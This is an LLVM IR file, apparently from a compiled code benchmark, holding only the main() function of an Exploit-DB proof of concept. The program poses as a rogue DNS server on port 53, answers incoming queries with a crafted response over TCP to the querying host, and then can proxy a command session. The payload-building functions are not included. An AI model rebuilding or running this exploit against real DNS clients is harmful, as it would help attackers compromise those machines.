; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/dos/extr_19615.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/dos/extr_19615.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i32, i8*, i32 }
%struct.sockaddr_in = type { i8*, %struct.TYPE_3__, i8* }
%struct.TYPE_3__ = type { i32 }
%struct.sockaddr = type { i32 }

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [34 x i8] c"Usage: %s architecture [command]\0A\00", align 1
@.str.1 = private unnamed_addr constant [26 x i8] c"Available architectures:\0A\00", align 1
@archlist = common dso_local global %struct.TYPE_4__* null, align 8
@.str.2 = private unnamed_addr constant [10 x i8] c"  %d: %s\0A\00", align 1
@arch = common dso_local global i64 0, align 8
@command = common dso_local global i8* null, align 8
@AF_INET = common dso_local global i8* null, align 8
@SOCK_DGRAM = common dso_local global i32 0, align 4
@IPPROTO_UDP = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [7 x i8] c"socket\00", align 1
@INADDR_ANY = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [5 x i8] c"bind\00", align 1
@.str.5 = private unnamed_addr constant [9 x i8] c"recvfrom\00", align 1
@.str.6 = private unnamed_addr constant [33 x i8] c"Received request from %s:%d for \00", align 1
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [8 x i8] c"connect\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.sockaddr_in, align 8
  %12 = alloca %struct.sockaddr_in, align 8
  %13 = alloca %struct.sockaddr_in, align 8
  %14 = alloca [16384 x i8], align 16
  %15 = alloca [16384 x i8], align 16
  %16 = alloca i16, align 2
  %17 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %18 = load i32, i32* %4, align 4
  %19 = icmp slt i32 %18, 2
  br i1 %19, label %20, label %54

20:                                               ; preds = %2
  %21 = load i32, i32* @stderr, align 4
  %22 = load i8**, i8*** %5, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 0
  %24 = load i8*, i8** %23, align 8
  %25 = call i32 (i32, i8*, ...) @fprintf(i32 %21, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str, i64 0, i64 0), i8* %24)
  %26 = load i32, i32* @stderr, align 4
  %27 = call i32 (i32, i8*, ...) @fprintf(i32 %26, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.1, i64 0, i64 0))
  store i32 -1, i32* %17, align 4
  br label %28

28:                                               ; preds = %37, %20
  %29 = load %struct.TYPE_4__*, %struct.TYPE_4__** @archlist, align 8
  %30 = load i32, i32* %17, align 4
  %31 = add nsw i32 %30, 1
  store i32 %31, i32* %17, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %29, i64 %32
  %34 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %33, i32 0, i32 0
  %35 = load i32, i32* %34, align 8
  %36 = icmp ne i32 %35, 0
  br i1 %36, label %37, label %52

37:                                               ; preds = %28
  %38 = load i32, i32* @stderr, align 4
  %39 = load %struct.TYPE_4__*, %struct.TYPE_4__** @archlist, align 8
  %40 = load i32, i32* %17, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %39, i64 %41
  %43 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %42, i32 0, i32 0
  %44 = load i32, i32* %43, align 8
  %45 = load %struct.TYPE_4__*, %struct.TYPE_4__** @archlist, align 8
  %46 = load i32, i32* %17, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %45, i64 %47
  %49 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %48, i32 0, i32 1
  %50 = load i8*, i8** %49, align 8
  %51 = call i32 (i32, i8*, ...) @fprintf(i32 %38, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0), i32 %44, i8* %50)
  br label %28

52:                                               ; preds = %28
  %53 = call i32 @exit(i32 1) #4
  unreachable

54:                                               ; preds = %2
  %55 = load i8**, i8*** %5, align 8
  %56 = getelementptr inbounds i8*, i8** %55, i64 1
  %57 = load i8*, i8** %56, align 8
  %58 = call i64 @atoi(i8* %57)
  %59 = sub i64 %58, 1
  store i64 %59, i64* @arch, align 8
  %60 = load i32, i32* %4, align 4
  %61 = icmp eq i32 %60, 3
  br i1 %61, label %62, label %66

62:                                               ; preds = %54
  %63 = load i8**, i8*** %5, align 8
  %64 = getelementptr inbounds i8*, i8** %63, i64 2
  %65 = load i8*, i8** %64, align 8
  store i8* %65, i8** @command, align 8
  br label %66

66:                                               ; preds = %62, %54
  %67 = load i8*, i8** @AF_INET, align 8
  %68 = load i32, i32* @SOCK_DGRAM, align 4
  %69 = load i32, i32* @IPPROTO_UDP, align 4
  %70 = call i32 @socket(i8* %67, i32 %68, i32 %69)
  store i32 %70, i32* %6, align 4
  %71 = icmp eq i32 %70, -1
  br i1 %71, label %72, label %75

72:                                               ; preds = %66
  %73 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0))
  %74 = call i32 @exit(i32 1) #4
  unreachable

75:                                               ; preds = %66
  %76 = call i32 @bzero(%struct.sockaddr_in* %11, i32 24)
  %77 = load i8*, i8** @AF_INET, align 8
  %78 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  store i8* %77, i8** %78, align 8
  %79 = load i32, i32* @INADDR_ANY, align 4
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  %81 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %80, i32 0, i32 0
  store i32 %79, i32* %81, align 8
  %82 = call i8* @htons(i32 53)
  %83 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i8* %82, i8** %83, align 8
  %84 = load i32, i32* %6, align 4
  %85 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %86 = call i32 @bind(i32 %84, %struct.sockaddr* %85, i32 24)
  %87 = icmp eq i32 %86, -1
  br i1 %87, label %88, label %91

88:                                               ; preds = %75
  %89 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0))
  %90 = call i32 @exit(i32 1) #4
  unreachable

91:                                               ; preds = %75
  br label %92

92:                                               ; preds = %158, %91
  store i32 24, i32* %7, align 4
  %93 = load i32, i32* %6, align 4
  %94 = getelementptr inbounds [16384 x i8], [16384 x i8]* %14, i64 0, i64 0
  %95 = bitcast %struct.sockaddr_in* %12 to %struct.sockaddr*
  %96 = call i32 @recvfrom(i32 %93, i8* %94, i32 16384, i32 0, %struct.sockaddr* %95, i32* %7)
  store i32 %96, i32* %8, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %101

98:                                               ; preds = %92
  %99 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.5, i64 0, i64 0))
  %100 = call i32 @exit(i32 1) #4
  unreachable

101:                                              ; preds = %92
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 1
  %103 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %102, i32 0, i32 0
  %104 = load i32, i32* %103, align 8
  %105 = call i8* @inet_ntoa(i32 %104)
  %106 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 0
  %107 = load i8*, i8** %106, align 8
  %108 = call i32 @ntohs(i8* %107)
  %109 = call i32 @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.6, i64 0, i64 0), i8* %105, i32 %108)
  %110 = getelementptr inbounds [16384 x i8], [16384 x i8]* %14, i64 0, i64 0
  %111 = bitcast i8* %110 to i32*
  %112 = getelementptr inbounds [16384 x i8], [16384 x i8]* %15, i64 0, i64 0
  %113 = call i32 @form_response(i32* %111, i8* %112)
  store i32 %113, i32* %9, align 4
  %114 = call i32 @bzero(%struct.sockaddr_in* %13, i32 24)
  %115 = load i8*, i8** @AF_INET, align 8
  %116 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  store i8* %115, i8** %116, align 8
  %117 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  %118 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 1
  %119 = bitcast %struct.TYPE_3__* %117 to i8*
  %120 = bitcast %struct.TYPE_3__* %118 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 8 %119, i8* align 8 %120, i64 4, i1 false)
  %121 = call i8* @htons(i32 53)
  %122 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i8* %121, i8** %122, align 8
  %123 = load i8*, i8** @AF_INET, align 8
  %124 = load i32, i32* @SOCK_STREAM, align 4
  %125 = call i32 @socket(i8* %123, i32 %124, i32 0)
  store i32 %125, i32* %10, align 4
  %126 = icmp eq i32 %125, -1
  br i1 %126, label %127, label %130

127:                                              ; preds = %101
  %128 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0))
  %129 = call i32 @exit(i32 1) #4
  unreachable

130:                                              ; preds = %101
  %131 = load i32, i32* %10, align 4
  %132 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %133 = call i32 @connect(i32 %131, %struct.sockaddr* %132, i32 24)
  %134 = icmp eq i32 %133, -1
  br i1 %134, label %135, label %138

135:                                              ; preds = %130
  %136 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0))
  %137 = call i32 @exit(i32 1) #4
  unreachable

138:                                              ; preds = %130
  %139 = load i32, i32* %9, align 4
  %140 = call i8* @htons(i32 %139)
  %141 = ptrtoint i8* %140 to i16
  store i16 %141, i16* %16, align 2
  %142 = load i32, i32* %10, align 4
  %143 = call i32 (i32, ...) @write(i32 %142, i16* %16, i32 2)
  %144 = load i32, i32* %10, align 4
  %145 = getelementptr inbounds [16384 x i8], [16384 x i8]* %15, i64 0, i64 0
  %146 = load i32, i32* %9, align 4
  %147 = call i32 (i32, ...) @write(i32 %144, i8* %145, i32 %146)
  %148 = load %struct.TYPE_4__*, %struct.TYPE_4__** @archlist, align 8
  %149 = load i64, i64* @arch, align 8
  %150 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %148, i64 %149
  %151 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %150, i32 0, i32 2
  %152 = load i32, i32* %151, align 8
  %153 = icmp sgt i32 %152, 1
  br i1 %153, label %154, label %157

154:                                              ; preds = %138
  %155 = load i32, i32* %10, align 4
  %156 = call i32 @close(i32 %155)
  br label %157

157:                                              ; preds = %154, %138
  br label %158

158:                                              ; preds = %157
  %159 = load %struct.TYPE_4__*, %struct.TYPE_4__** @archlist, align 8
  %160 = load i64, i64* @arch, align 8
  %161 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %159, i64 %160
  %162 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %161, i32 0, i32 2
  %163 = load i32, i32* %162, align 8
  %164 = icmp sgt i32 %163, 1
  br i1 %164, label %92, label %165

165:                                              ; preds = %158
  %166 = load i32, i32* %10, align 4
  %167 = call i32 @proxyloop(i32 %166)
  %168 = call i32 @exit(i32 1) #4
  unreachable
}

declare dso_local i32 @fprintf(i32, i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @atoi(i8*) #1

declare dso_local i32 @socket(i8*, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @bzero(%struct.sockaddr_in*, i32) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i32 @bind(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @recvfrom(i32, i8*, i32, i32, %struct.sockaddr*, i32*) #1

declare dso_local i32 @printf(i8*, i8*, i32) #1

declare dso_local i8* @inet_ntoa(i32) #1

declare dso_local i32 @ntohs(i8*) #1

declare dso_local i32 @form_response(i32*, i8*) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #3

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @write(i32, ...) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @proxyloop(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind willreturn }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
